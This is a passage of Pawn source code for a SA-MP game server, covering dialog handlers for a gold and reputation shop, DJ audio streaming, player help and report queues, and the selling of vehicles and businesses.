		ShowPlayerDialog(playerid, 9066, DIALOG_STYLE_MSGBOX, "Premium Account Level [2]", "Do you sure to buy premium account level [2] for 1 year by 3000 gold?", "Accept", "Close");
		return 1;
		}
		}
		else {
		return 1;
		}
		}
		if(dialogid == 9066) {
		if(response) {
		PINFO[playerid][pPremiumAccount] = PPA[playerid];
		SaveKonVal(playerid, "pPremiumAccount", PPA[playerid]);
		new string[256];
		new dd,mm,yy;
		getdate(dd,mm,yy);
		format(string,sizeof(string), "%s%d/%s%d/%s%d", (dd < 10) ? ("0") : (""),dd, (mm < 10) ? ("0") : (""),mm, (yy < 10) ? ("0") : (""),yy);
		PINFO[playerid][pGold] -= PPG[playerid];
		SaveKonVal(playerid, "pGold", PINFO[playerid][pGold]);
		new str[512];
		format(str, sizeof(str), "[Shop]: Shoma ba 200 Gold , premium account Kharidid.",PPA[playerid],PPD[playerid],PPG[playerid])
		SCM(playerid, COLOR_YELLOW, str);
		return 1;
		}
		else {
		return 1;
		}
		}
		if(dialogid == 9065) {
		if(response) {
		PINFO[playerid][pRep] += RRP[playerid];
		SaveKonVal(playerid, "pRep", PINFO[playerid][pRep]);
		PINFO[playerid][pGold] -= RRG[playerid];
		SaveKonVal(playerid, "pGold", PINFO[playerid][pGold]);
		new str[512];
		format(str, sizeof(str), "[Shop]: you succeefully bought %d Rep points by %d golds.",RRP[playerid],RRG[playerid])
		SCM(playerid, COLOR_YELLOW, str);
		return 1;
		}
		else {
		return 1;
		}
		}
		if(dialogid == 9064) {
		if(response) {
		GivePlayerPool(playerid, CMP[playerid]);
		PINFO[playerid][pGold] -= CMG[playerid];
		SaveKonVal(playerid, "pGold", PINFO[playerid][pGold]);
		new str[512];
		format(str, sizeof(str), "[Shop]: you succeefully bought $%s by %d golds.",FormatNumber(CMP[playerid]),CMG[playerid])
		SCM(playerid, COLOR_YELLOW, str);
		return 1;
		}
		else {
		return 1;
		}
		}








	if(dialogid == DIALOG_KHARID)
	{
		if(response)
		{
			if(listitem == 0) return OnPlayerCommandText(playerid, "/forum");
			if(listitem == 1) return SellGoldItem(playerid,"Premium Account (15 Days)",100);
			if(listitem == 2) return SellGoldItem(playerid,"Premium Account (30 Days)",300);
			if(listitem == 3) return SellGoldItem(playerid,"Premium Account (60 Days)",450);
			if(listitem == 4) return SellGoldItem(playerid,"Premium Account (Unlimited Days)",1000);
			if(listitem == 5) return SellGoldItem(playerid,"$10,000 Cash",100);
			if(listitem == 6) return SellGoldItem(playerid,"$30,000 Cash",250);
			if(listitem == 7) return SellGoldItem(playerid,"$100,000 Cash",850);
			if(listitem == 8) return SellGoldItem(playerid,"$250,000 Cash",1500);
			if(listitem == 9) return SellGoldItem(playerid,"$500,000 Cash",2700);
			if(listitem == 10) return SellGoldItem(playerid,"$1,000,000 Cash",4000);
			if(listitem == 11) return SellGoldItem(playerid,"1000 Rep Points",100);
			if(listitem == 12) return SellGoldItem(playerid,"5000 Rep Points",350);
			if(listitem == 13) return SellGoldItem(playerid,"Clan (10 Slots)(1 Month)",100);
			if(listitem == 14) return SellGoldItem(playerid,"Clan (25 Slots)(1 Month)",200);
			if(listitem == 15) return SellGoldItem(playerid,"Clan (50 Slots)(1 Month)",400);
			if(listitem == 16) return SendClientMessage(playerid, COLOR_LIGHTBLUE,"Baraie Kharid In Package, Baiad Dar /Forum Elam Konid.");
			if(listitem == 17) return SendClientMessage(playerid, COLOR_LIGHTBLUE,"Forum.{57e547}JoKeRGaminG {FFFFFF}.iR");
			if(listitem == 18) return SendClientMessage(playerid, COLOR_LIGHTBLUE,"Forum.{57e547}JoKeRGaminG {FFFFFF}.iR");
			if(listitem == 19) return SellGoldItem(playerid,"Change Name",150);
			if(listitem == 20) return SellGoldItem(playerid,"Reset Vehicle Odometer",50);
		}
	}
	if(dialogid == DIALOG_DJ)
	{
		if(response)
		{
			for(new i = 0;i<MAX_PLAYERS;i++)
			{
				if(IsPlayerInRangeOfPoint(i,60.0,487.6212,-6.2195,1002.0781))
				{
					if(listitem == 0) PlayAudioStreamForPlayer(i, "http://dl.mahtabmusic.ir/1396/06/single/Sahar%20-%20Ey%20Vay%20&%20Ey%20Jan%20(Remix)%20%5b128%5d.mp3",487.6212,-6.2195,1002.0781,20, 1);
					if(listitem == 1) PlayAudioStreamForPlayer(i, "http://cdn.persiangig.com/dl/h4VSO/qGTgHBvIkZ/Trap%20Music%20vol.22%20(2).mp3",487.6212,-6.2195,1002.0781,20, 1);
					if(listitem == 2) PlayAudioStreamForPlayer(i, "http://dl.baran-music.com/music/1397/01/Hoorosh%20Band%20-%20Mah%20Pishooni%20(Amir%20Azari%20Remix).mp3",487.6212,-6.2195,1002.0781,20, 1);
					if(listitem == 3) PlayAudioStreamForPlayer(i, "http://vip.opload.ir/vipdl/95/12/hashempor/-Dj-Boby-part-17-WwW-IRahang-IR-.mp3",487.6212,-6.2195,1002.0781,20, 1);
				}
			}
		}
	}
    if(dialogid == 7815)
    {
        if(response)
        {
            new string[100];
            format(string, 100, "%s(%i): %s", PINFO[HelpmeDLG[playerid][listitem]][pName],HelpmeDLG[playerid][listitem],HelpmeText[HelpmeDLG[playerid][listitem]]);
            ShowPlayerDialog(playerid, 7519, DIALOG_STYLE_MSGBOX, "[HELPMES]", string, "Accept", "Close");
            SelectedRequest[playerid] = HelpmeDLG[playerid][listitem];
        }
    }
  /*  if(dialogid == NEON)
	{
		if(response)
		{
		    if(listitem == 0)
		    {
		    if(neonsx[GetPlayerVehicleID(playerid)] == 0)
		    {
		        SetPVarInt(playerid, "neon", 1);
            	                     SetPVarInt(playerid, "red", CreateObject(18648,0,0,0,0,0,0));
             	        SetPVarInt(playerid, "red1", CreateObject(18648,0,0,0,0,0,0));
            	                    AttachObjectToVehicle(GetPVarInt(playerid, "red"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
            	                    AttachObjectToVehicle(GetPVarInt(playerid, "red1"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
            	                    GameTextForPlayer(playerid, "~b~ Abi ~w~Cheragh Zir Ezafe Shod",3500,5);
            	                    neonsx[GetPlayerVehicleID(playerid)] = 1;
            	                    }
		  }
					    if(listitem == 1)
		    {
		    if(neonsx[GetPlayerVehicleID(playerid)] == 0)
		    {
		        SetPVarInt(playerid, "neon", 1);
            	                     SetPVarInt(playerid, "red", CreateObject(19296,0,0,0,0,0,0));
             	        SetPVarInt(playerid, "red1", CreateObject(19296,0,0,0,0,0,0));
            	                    AttachObjectToVehicle(GetPVarInt(playerid, "red"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
            	                    AttachObjectToVehicle(GetPVarInt(playerid, "red1"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
            	                    GameTextForPlayer(playerid, "~r~ Red ~w~Cheragh Zir Ezafe Shod",3500,5);
            	                    neonsx[GetPlayerVehicleID(playerid)] = 1;
            	                    }
			}
              if(listitem == 2)
		    {
		    if(neonsx[GetPlayerVehicleID(playerid)] == 0)
		    {
		        SetPVarInt(playerid, "neon", 1);
            	                     SetPVarInt(playerid, "red", CreateObject(19297,0,0,0,0,0,0));
             	        SetPVarInt(playerid, "red1", CreateObject(19297,0,0,0,0,0,0));
            	                    AttachObjectToVehicle(GetPVarInt(playerid, "red"), GetPlayerVehicleID(playerid), -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
            	                    AttachObjectToVehicle(GetPVarInt(playerid, "red1"), GetPlayerVehicleID(playerid), 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
            	                    GameTextForPlayer(playerid, "~g~ Sabz ~w~Cheragh Zir Ezafe Shod",3500,5);
            	                    neonsx[GetPlayerVehicleID(playerid)] = 1;
            	                    }
			}

                                       if(listitem == 3)
			{
	   			DestroyObject(GetPVarInt(playerid, "red"));
	                                      DeletePVar(playerid, "neon");
	                                      DestroyObject(GetPVarInt(playerid, "red1"));
                                                    GameTextForPlayer(playerid, "~g~Cheragh Zir Ghat Shod",3500,5);
                                                    neonsx[GetPlayerVehicleID(playerid)] = 0;
                                        }
		        }
 	}
	*/
    if(dialogid == 7519)
    {
        if(response)
        {
            new lol[20];
            format(lol, 20, "/ahelpme %i", SelectedRequest[playerid]);
            OnPlayerCommandText(playerid, lol);
        }
    }
    if(dialogid == 7820)
    {
        if(response)
        {
            new string[100];
            format(string, 100, "%s(%i): %s", PINFO[ReportDLG[playerid][listitem]][pName],ReportDLG[playerid][listitem],ReportText[ReportDLG[playerid][listitem]]);
            ShowPlayerDialog(playerid, 7521, DIALOG_STYLE_MSGBOX, "[REPORT]", string, "Accept", "Close");
            SelectedRRequest[playerid] = ReportDLG[playerid][listitem];
        }
    }
    if(dialogid == 7521)
    {
        if(response)
        {
            new lol[20];
            format(lol, 20, "/areport %i", SelectedRRequest[playerid]);
            OnPlayerCommandText(playerid, lol);
        }
    }
    if(dialogid == 78200)
    {
        if(response)
        {
            new string[100];
            format(string, 100, "Do You Accept Suspect : %s(%i) ?", PINFO[WDLG[playerid][listitem]][pName],WDLG[playerid][listitem]);
            ShowPlayerDialog(playerid, 75210, DIALOG_STYLE_MSGBOX, "[Wanted]", string, "Accept", "Close");
            SelectedWRequest[playerid] = WDLG[playerid][listitem];
        }
    }
    if(dialogid == 75210)
    {
        if(response)
        {
            new lol[20];
            format(lol, 20, "/find %i", SelectedWRequest[playerid]);
            OnPlayerCommandText(playerid, lol);
	        for(new i = 0; i < LastPID; i++)
                {
                    if(IsPlayerConnected(i))
                    {
                        if(IsACop(i))
                        {
			    new name[512];
			    new cbjstore2[512];
			    new plr = SelectedWRequest[playerid];
			    GetPlayerName(plr, name, sizeof(name));
                format(cbjstore2, sizeof(cbjstore2), "Cop %s Accepted Suspect : %s(%i)",PlayerInfo[playerid][pName],name,SelectedWRequest[playerid]);
                SendClientMessage(i, TEAM_BLUE_COLOR, cbjstore2);
                        }
                    }
                }
        }
    }
		 if(dialogid == 092178)
		 {
		  if(response)
        {
           	switch(listitem)// Checking which listitem was selected
        	{
        	    case 0:// The first item listed
        	    {
        	        if(PlayerInfo[playerid][pRep] > 10 )
        	        {
					GivePlayerTofang(playerid, 9, 100);
					PlayerInfo[playerid][pRep] = PlayerInfo[playerid][pRep]-10;
					SaveKonVal(playerid, "pRep", PlayerInfo[playerid][pRep]);
					SCM(playerid,COLOR_BAN,"Shoma [Chainsaw] Ba 10 Rep Point Gerftid");
					}
        	        else
        	        {
        	             ShowPlayerDialog(playerid, 092178, DIALOG_STYLE_LIST, "Chi MIkhay ?", "1000$=10rep\nMinigun = 35rep\nSniper = 25rep\nChagho = 12rep\nArmor =22rep\nJetPack = 58rp\nRespect = 15rp\nInfeRnus = 35 rp\n+1(Level) = 80 rp\nShamShir\nCancel", "Begir", "");
        	        }
        	    }
        	    case 1:// The first item listed
        	    {
        	        if(PlayerInfo[playerid][pRep] > 100 )
        	        {
					GivePlayerTofang(playerid, 38, 500);
					PlayerInfo[playerid][pRep] = PlayerInfo[playerid][pRep]-100;
					SaveKonVal(playerid, "pRep", PlayerInfo[playerid][pRep]);
					SCM(playerid,COLOR_BAN,"Shoma [Mini Gun] Ba 100 Rep Point Gerftid");
					}
        	        else
        	        {
        	             ShowPlayerDialog(playerid, 092178, DIALOG_STYLE_LIST, "Chi MIkhay ?", "1000$=10rep\nMinigun = 35rep\nSniper = 25rep\nChagho = 12rep\nArmor =22rep\nJetPack = 58rp\nRespect = 15rp\nInfeRnus = 35 rp\n+1(Level) = 80 rp\nShamShir\nCancel", "Begir", "");
        	        }
        	    }
        	    case 2:// The first item listed
        	    {
        	        if(PlayerInfo[playerid][pRep] > 25 )
        	        {
					GivePlayerTofang(playerid, 25, 60);
					PlayerInfo[playerid][pRep] = PlayerInfo[playerid][pRep]-25;
					SaveKonVal(playerid, "pRep", PlayerInfo[playerid][pRep]);
					SCM(playerid,COLOR_BAN,"Shoma [shotgun] Ba 25 Rep Point Gerftid");
					}
        	        else
        	        {
        	             ShowPlayerDialog(playerid, 092178, DIALOG_STYLE_LIST, "Chi MIkhay ?", "1000$=10rep\nMinigun = 35rep\nSniper = 25rep\nChagho = 12rep\nArmor =22rep\nJetPack = 58rp\nRespect = 15rp\nInfeRnus = 35 rp\n+1(Level) = 80 rp\nShamShir\nCancel", "Begir", "");
        	        }
        	    }
         	    case 3:// The first item listed
        	    {
        	        if(PlayerInfo[playerid][pRep] > 20 )
        	        {
					GivePlayerTofang(playerid, 26, 50);
					PlayerInfo[playerid][pRep] = PlayerInfo[playerid][pRep]-20;
					SaveKonVal(playerid, "pRep", PlayerInfo[playerid][pRep]);
					SCM(playerid,COLOR_BAN,"Shoma [Sawnoff Shotgun] Ba 20 Rep Point Gerftid");
					}
        	        else
        	        {
        	             ShowPlayerDialog(playerid, 092178, DIALOG_STYLE_LIST, "Chi MIkhay ?", "1000$=10rep\nMinigun = 35rep\nSniper = 25rep\nChagho = 12rep\nArmor =22rep\nJetPack = 58rp\nRespect = 15rp\nInfeRnus = 35 rp\n+1(Level) = 80 rp\nShamShir\nCancel", "Begir", "");
        	             }
        	    }
        	    case 4:// The first item listed
        	    {
        	        if(PlayerInfo[playerid][pRep] > 30 )
        	        {
				    GivePlayerTofang(playerid, 33, 100);
					PlayerInfo[playerid][pRep] = PlayerInfo[playerid][pRep]-30;
					SaveKonVal(playerid, "pRep", PlayerInfo[playerid][pRep]);
					SCM(playerid,COLOR_BAN,"Shoma [Country Rifle] Ba 30 Rep Point Gerftid");
					}
        	        else
        	        {
        	            ShowPlayerDialog(playerid, 092178, DIALOG_STYLE_LIST, "Chi MIkhay ?", "1000$=10rep\nMinigun = 35rep\nSniper = 25rep\nChagho = 12rep\nArmor =22rep\nJetPack = 58rp\nRespect = 15rp\nInfeRnus = 35 rp\n+1(Level) = 80 rp\nShamShir\nCancel", "Begir", "");
        	        }
        	    }
        	    case 5:// The first item listed
        	    {
        	        if(PlayerInfo[playerid][pRep] > 57 )
        	        {
					PlayerInfo[playerid][pRep] = PlayerInfo[playerid][pRep]-58;
					SaveKonVal(playerid, "pRep", PlayerInfo[playerid][pRep]);
					GivePlayerJetpack(playerid);
					SCM(playerid,COLOR_BAN,"Shoma [JetPack] Ba 58 Rep Point Gerftid");
					}
        	        else
        	        {
        	            ShowPlayerDialog(playerid, 092178, DIALOG_STYLE_LIST, "Chi MIkhay ?", "1000$=10rep\nMinigun = 35rep\nSniper = 25rep\nChagho = 12rep\nArmor =22rep\nJetPack = 58rp\nRespect = 15rp\nInfeRnus = 35 rp\n+1(Level) = 80 rp\nShamShir\nCancel", "Begir", "");
    	            }
        	    }
        	    case 6:// The first item listed
        	    {
        	        if(PlayerInfo[playerid][pRep] > 35 )
        	        {
					PlayerInfo[playerid][pRep] = PlayerInfo[playerid][pRep]-35;
					SaveKonVal(playerid, "pRep", PlayerInfo[playerid][pRep]);
					GivePlayerTofang(playerid, 34, 100);
					SCM(playerid,COLOR_BAN,"Shoma [Sniper Rifle] Ba 35 Rep Point Gerftid");
					}
        	        else
        	        {
        	            ShowPlayerDialog(playerid, 092178, DIALOG_STYLE_LIST, "Chi MIkhay ?", "1000$=10rep\nMinigun = 35rep\nSniper = 25rep\nChagho = 12rep\nArmor =22rep\nJetPack = 58rp\nRespect = 15rp\nInfeRnus = 35 rp\n+1(Level) = 80 rp\nShamShir\nCancel", "Begir", "");
    	            }
        	    }
        	    case 7:// The first item listed
        	    {
        	        if(PlayerInfo[playerid][pRep] > 34 )
        	        {
					PlayerInfo[playerid][pRep] = PlayerInfo[playerid][pRep]-35;
					SaveKonVal(playerid, "pRep", PlayerInfo[playerid][pRep]);
					new Float:a,Float:b,Float:c;
					new objj;
					GetPlayerPos(playerid,a,b,c);
					objj = CreateVehicle(411, a, b, c, 0.0000, random(100), -1, 100);
					SCM(playerid,COLOR_BAN,"Shoma [InfeRnus] Ba 35 Rep Point Gerftid");
					PutPlayerInVehicle(playerid,objj,0);
					}
        	        else
        	        {
        	            ShowPlayerDialog(playerid, 092178, DIALOG_STYLE_LIST, "Chi MIkhay ?", "1000$=10rep\nMinigun = 35rep\nSniper = 25rep\nChagho = 12rep\nArmor =22rep\nJetPack = 58rp\nRespect = 15rp\nInfeRnus = 35 rp\n+1(Level) = 80 rp\nShamShir\nCancel", "Begir", "");
    	            }
        	    }
        	    case 8:// The first item listed
        	    {
        	        if(PlayerInfo[playerid][pRep] > 80 )
        	        {
					PlayerInfo[playerid][pRep] = PlayerInfo[playerid][pRep]-80;
					SaveKonVal(playerid, "pRep", PlayerInfo[playerid][pRep]);
					GivePlayerTofang(playerid, 36, 50);
					SCM(playerid,COLOR_BAN,"Shoma [HS Rocket] Ba 80 Rep Point Gerftid");
					}
        	        else
        	        {
        	            ShowPlayerDialog(playerid, 092178, DIALOG_STYLE_LIST, "Chi MIkhay ?", "1000$=10rep\nMinigun = 35rep\nSniper = 25rep\nChagho = 12rep\nArmor =22rep\nJetPack = 58rp\nRespect = 15rp\nInfeRnus = 35 rp\n+1(Level) = 80 rp\nShamShir\nCancel", "Begir", "");
    	            }
        	    }
        	    case 9:// The first item listed
        	    {
        	        if(PlayerInfo[playerid][pRep] > 10 )
        	        {
					PlayerInfo[playerid][pRep] = PlayerInfo[playerid][pRep]-10;
					SaveKonVal(playerid, "pRep", PlayerInfo[playerid][pRep]);
					GivePlayerTofang(playerid,43,100);
					SCM(playerid,COLOR_BAN,"Shoma [Camera] Ba 10 Rep Point Gerftid");
					}
        	        else
        	        {
        	            ShowPlayerDialog(playerid, 092178, DIALOG_STYLE_LIST, "Chi MIkhay ?", "1000$=10rep\nMinigun = 35rep\nSniper = 25rep\nChagho = 12rep\nArmor =22rep\nJetPack = 58rp\nRespect = 15rp\nInfeRnus = 35 rp\n+1(Level) = 80 rp\nShamShir\nCancel", "Begir", "");
    	            }
        	    }

    	    }
    	    }
	}
		 if(dialogid == 4202)
		 {
		  if(response)
        {
           	switch(listitem)// Checking which listitem was selected
        	{
        	    case 0:// The first item listed
        	    {
				pbdg += 1;
        	    }
        	    case 1:// The first item listed
        	    {
				pbsl += 1;
        	    }
        	    case 2:// The first item listed
        	    {
				pbsg += 1;
        	    }
        	    case 3:// The first item listed
        	    {
				pbss += 1;
        	    }
        	    case 4:// The first item listed
        	    {
				pbcs += 1;
        	    }
				case 5:// The first item listed
        	    {
				pbmp += 1;
        	    }
				case 6:// The first item listed
        	    {
				pbsr += 1;
        	    }
				case 7:// The first item listed
        	    {
				pbak += 1;
        	    }
				case 8:// The first item listed
        	    {
				pbm4 += 1;
        	    }
				case 9:// The first item listed
        	    {
				pbcr += 1;
        	    }

    	    }
    	    }
	}
    if(dialogid == 8347)
    {
        if(response)
        {
            if(PINFO[playerid][pCar] == 0) return SCM(playerid,COL_SYN,"You are not sitting on your vehicle");
            if(GetPlayerVehicleID(playerid) != PINFO[playerid][pCar]) return SCM(playerid,COLOR_ALI,"You must be in your vehicle to see it.");
            if(!IsPlayerInRangeOfPoint(playerid,8.0,329.8260,-1516.1796,35.8671)) return SCM(playerid,COLOR_ALI,"You are not in dealer ship.");
            new price = ((PINFO[playerid][cPrice])*(40)/(100));
            GivePlayerPool(playerid,price);
            MashinOwner[PINFO[playerid][pCar]] = 9999;
            DestroyVehicle(PINFO[playerid][pCar], true);
            OwnedMashin[PINFO[playerid][pCar]] = 0;
            PINFO[playerid][pCar] = 0;
            SaveKonVal(playerid, "pCar", 0);
            PlayerInfo[playerid][cLocationx] = 0.0;
            SaveKonFloat(playerid, "cLocationx", 0);
            PlayerInfo[playerid][cLocationy] = 0.0;
            SaveKonFloat(playerid, "cLocationy", 0);
            PlayerInfo[playerid][cLocationz] = 0.0;
            SaveKonFloat(playerid, "cLocationz", 0);
            PlayerInfo[playerid][cAngle] = 0.0;
            SaveKonFloat(playerid, "cAngle", 0);
            PlayerInfo[playerid][cColor1] = 9999;
            SaveKonVal(playerid, "cColor1", 9999);
            PlayerInfo[playerid][cColor2] = 9999;
            SaveKonVal(playerid, "cColor2", 9999);
            PlayerInfo[playerid][cModel] = 0;
            SaveKonVal(playerid, "cModel", 0);
            PlayerInfo[playerid][cPrice] = 0;
            SaveKonVal(playerid, "cPrice", 0);
            strmid(PlayerInfo[playerid][cPlate], "New Veh", 0, strlen("New Veh"), 255);
            SaveKonStr(playerid, "cPlate", PINFO[playerid][cPlate]);
            PlayerInfo[playerid][cLock] = 0;
            SaveKonVal(playerid, "cLock", 0);
            PlayerInfo[playerid][cDestroyed] = 0;
            SaveKonVal(playerid, "cDestroyed", 0);
            PINFO[playerid][cFixed] = 0;
            SaveKonVal(playerid, "cFixed", 0);
            PINFO[playerid][cInsurance] = 0;
            SaveKonVal(playerid, "cInsurance", 0);
            PlayerInfo[playerid][cFuel] = 0;
            SaveKonVal(playerid, "cFuel", 0);
            PlayerInfo[playerid][cHealth] = 0.0;
            SaveKonFloat(playerid, "cHealth", 0);
            PINFO[playerid][gLocationX] = 0;
            SaveKonFloat(playerid, "gLocationX", 0);
            PINFO[playerid][gLocationY] = 0;
            SaveKonFloat(playerid, "gLocationY", 0);
            PINFO[playerid][gLocationZ] = 0;
            SaveKonFloat(playerid, "gLocationZ", 0);
            PINFO[playerid][gAngle] = 0;
            SaveKonFloat(playerid, "gAngle", 0);
            PINFO[playerid][gParked] = 0;
            SaveKonVal(playerid, "gParked", 0);
            PlayerInfo[playerid][cMod1] = 0;
            SaveKonVal(playerid, "cMod1", 0);
            PlayerInfo[playerid][cMod3] = 0;
            SaveKonVal(playerid, "cMod3", 0);
            PlayerInfo[playerid][cMod4] = 0;
            SaveKonVal(playerid, "cMod4", 0);
            PlayerInfo[playerid][cMod5] = 0;
            SaveKonVal(playerid, "cMod5", 0);
            PlayerInfo[playerid][cMod6] = 0;
            SaveKonVal(playerid, "cMod6", 0);
            PlayerInfo[playerid][cMod7] = 0;
            SaveKonVal(playerid, "cMod7", 0);
            PlayerInfo[playerid][cMod8] = 0;
            SaveKonVal(playerid, "cMod8", 0);
            PlayerInfo[playerid][cMod9] = 0;
            SaveKonVal(playerid, "cMod9", 0);
            PlayerInfo[playerid][cMod10] = 0;
            SaveKonVal(playerid, "cMod10", 0);
            PlayerInfo[playerid][cMod11] = 0;
            SaveKonVal(playerid, "cMod11", 0);
            PlayerInfo[playerid][cMod12] = 0;
            SaveKonVal(playerid, "cMod12", 0);
            PlayerInfo[playerid][cMod13] = 0;
            SaveKonVal(playerid, "cMod13", 0);
            PlayerInfo[playerid][cMod14] = 0;
            SaveKonVal(playerid, "cMod14", 0);
            PlayerInfo[playerid][cMod15] = 0;
            SaveKonVal(playerid, "cMod15", 0);
            PlayerInfo[playerid][cMod16] = 0;
            SaveKonVal(playerid, "cMod16", 0);
            PlayerInfo[playerid][cMod17] = 0;
            SaveKonVal(playerid, "cMod17", 0);
            PlayerInfo[playerid][cPaintJob] = 3;
            SaveKonVal(playerid, "cPaintJob", 3);
            PlayerInfo[playerid][cKilo] = 0.0;
            SaveKonFloat(playerid, "cKilo", 0);
            PlayerInfo[playerid][cPanel] = 0;
            SaveKonVal(playerid, "cPanel", 0);
            PINFO[playerid][cDoors] = 0;
            SaveKonVal(playerid, "cDoors", 0);
            PINFO[playerid][cLights] = 0;
            SaveKonVal(playerid, "cLights", 0);
            PINFO[playerid][cTires] = 0;
            SaveKonVal(playerid, "cTires", 0);
            PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
            //SaveAccount(playerid);
            new string[256];format(string,256,"You sold your vehicle for $%s",FormatNumber(price));
            SCM(playerid,COLOR_ALI,string);
            return 1;
        }
    }
    if(dialogid == 8348)
    {
        if(response)
        {
            if(PINFO[playerid][pCar_2] == 0) return SCM(playerid,COL_SYN,"You are not sitting on your vehicle");
            if(GetPlayerVehicleID(playerid) != PINFO[playerid][pCar_2]) return SCM(playerid,COLOR_ALI,"You must be in your vehicle to see it.");
            if(!IsPlayerInRangeOfPoint(playerid,8.0,329.8260,-1516.1796,35.8671)) return SCM(playerid,COLOR_ALI,"You are not in dealer ship.");
            new price = ((PINFO[playerid][cPrice_2])*(40)/(100));
            GivePlayerPool(playerid,price);
            DestroyVehicle(PINFO[playerid][pCar_2], true);
            OwnedMashin_2[PINFO[playerid][pCar_2]] = 0;
            MashinOwner_2[PINFO[playerid][pCar_2]] = 9999;
            PINFO[playerid][pCar_2] = 0;
            SaveKonVal(playerid, "pCar_2", 0);
            PlayerInfo[playerid][cLocationx_2] = 0.0;
            SaveKonFloat(playerid, "cLocationx_2", 0);
            PlayerInfo[playerid][cLocationy_2] = 0.0;
            SaveKonFloat(playerid, "cLocationy_2", 0);
            PlayerInfo[playerid][cLocationz_2] = 0.0;
            SaveKonFloat(playerid, "cLocationz_2", 0);
            PlayerInfo[playerid][cAngle_2] = 0.0;
            SaveKonFloat(playerid, "cAngle_2", 0);
            PlayerInfo[playerid][cColor1_2] = 9999;
            SaveKonVal(playerid, "cColor1_2", 9999);
            PlayerInfo[playerid][cColor2_2] = 9999;
            SaveKonVal(playerid, "cColor2_2", 9999);
            PlayerInfo[playerid][cModel_2] = 0;
            SaveKonVal(playerid, "cModel_2", 0);
            PlayerInfo[playerid][cPrice_2] = 0;
            SaveKonVal(playerid, "cPrice_2", 0);
            strmid(PlayerInfo[playerid][cPlate_2], "New Veh", 0, strlen("New Veh"), 255);
            SaveKonStr(playerid, "cPlate_2", PINFO[playerid][cPlate_2]);
            PlayerInfo[playerid][cLock_2] = 0;
            SaveKonVal(playerid, "cLock_2", 0);
            PlayerInfo[playerid][cDestroyed_2] = 0;
            SaveKonVal(playerid, "cDestroyed_2", 0);
            PINFO[playerid][cFixed_2] = 0;
            SaveKonVal(playerid, "cFixed_2", 0);
            PINFO[playerid][cInsurance_2] = 0;
            SaveKonVal(playerid, "cInsurance_2", 0);
            PlayerInfo[playerid][cFuel_2] = 0;
            SaveKonVal(playerid, "cFuel_2", 0);
            PINFO[playerid][gLocationX_2] = 0;
            SaveKonFloat(playerid, "gLocationX_2", 0);
            PINFO[playerid][gLocationY_2] = 0;
            SaveKonFloat(playerid, "gLocationY_2", 0);
            PINFO[playerid][gLocationZ_2] = 0;
            SaveKonFloat(playerid, "gLocationZ_2", 0);
            PINFO[playerid][gAngle_2] = 0;
            SaveKonFloat(playerid, "gAngle_2", 0);
            PINFO[playerid][gParked_2] = 0;
            SaveKonVal(playerid, "gParked_2", 0);
            PlayerInfo[playerid][cHealth_2] = 0.0;
            SaveKonFloat(playerid, "cHealth_2", 0);
            PlayerInfo[playerid][cMod1_2] = 0;
            SaveKonVal(playerid, "cMod1_2", 0);
            PlayerInfo[playerid][cMod3_2] = 0;
            SaveKonVal(playerid, "cMod3_2", 0);
            PlayerInfo[playerid][cMod4_2] = 0;
            SaveKonVal(playerid, "cMod4_2", 0);
            PlayerInfo[playerid][cMod5_2] = 0;
            SaveKonVal(playerid, "cMod5_2", 0);
            PlayerInfo[playerid][cMod6_2] = 0;
            SaveKonVal(playerid, "cMod6_2", 0);
            PlayerInfo[playerid][cMod7_2] = 0;
            SaveKonVal(playerid, "cMod7_2", 0);
            PlayerInfo[playerid][cMod8_2] = 0;
            SaveKonVal(playerid, "cMod8_2", 0);
            PlayerInfo[playerid][cMod9_2] = 0;
            SaveKonVal(playerid, "cMod9_2", 0);
            PlayerInfo[playerid][cMod10_2] = 0;
            SaveKonVal(playerid, "cMod10_2", 0);
            PlayerInfo[playerid][cMod11_2] = 0;
            SaveKonVal(playerid, "cMod11_2", 0);
            PlayerInfo[playerid][cMod12_2] = 0;
            SaveKonVal(playerid, "cMod12_2", 0);
            PlayerInfo[playerid][cMod13_2] = 0;
            SaveKonVal(playerid, "cMod13_2", 0);
            PlayerInfo[playerid][cMod14_2] = 0;
            SaveKonVal(playerid, "cMod14_2", 0);
            PlayerInfo[playerid][cMod15_2] = 0;
            SaveKonVal(playerid, "cMod15_2", 0);
            PlayerInfo[playerid][cMod16_2] = 0;
            SaveKonVal(playerid, "cMod16_2", 0);
            PlayerInfo[playerid][cMod17_2] = 0;
            SaveKonVal(playerid, "cMod17_2", 0);
            PlayerInfo[playerid][cPaintJob_2] = 3;
            SaveKonVal(playerid, "cPaintJob_2", 3);
            PlayerInfo[playerid][cKilo_2] = 0.0;
            SaveKonFloat(playerid, "cKilo_2", 0);
            PlayerInfo[playerid][cPanel_2] = 0;
            SaveKonVal(playerid, "cPanel_2", 0);
            PINFO[playerid][cDoors_2] = 0;
            SaveKonVal(playerid, "cDoors_2", 0);
            PINFO[playerid][cLights_2] = 0;
            SaveKonVal(playerid, "cLights_2", 0);
            PINFO[playerid][cTires_2] = 0;
            SaveKonVal(playerid, "cTires_2", 0);
            PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
            //SaveAccount(playerid);
            new string[256];format(string,256,"You sold your vehicle for $%s",FormatNumber(price));
            SCM(playerid,COLOR_ALI,string);
            return 1;
        }
    }
    if(dialogid == 9743)
    {
        if(PINFO[playerid][pPbiskey] == 9999) return SCM(playerid,COLOR_ALI,"You haven't any business.");
        new buz = PINFO[playerid][pPbiskey];
        if(buz >= 500) return SCM(playerid,COLOR_ALI,"Error.");
        if(!IsPlayerInRangeOfPoint(playerid,5,BizzInfo[buz][bEntranceX],BizzInfo[buz][bEntranceY],BizzInfo[buz][bEntranceZ]) && (Mahal[playerid] != 15 && TooBiz[playerid] != buz)) return SCM(playerid,COLOR_ALI,"You must be near of the biz door or you must enter it.");
        new price = ((BizzInfo[buz][bBuyPrice] * 50)/(100));
        GivePlayerPool(playerid,price);
        BizzInfo[buz][bOwned] = 0;
        format(BizzInfo[buz][bOwner],64,"The State");
        OnBizUpdate(buz);
        PINFO[playerid][pPbiskey] = 9999;
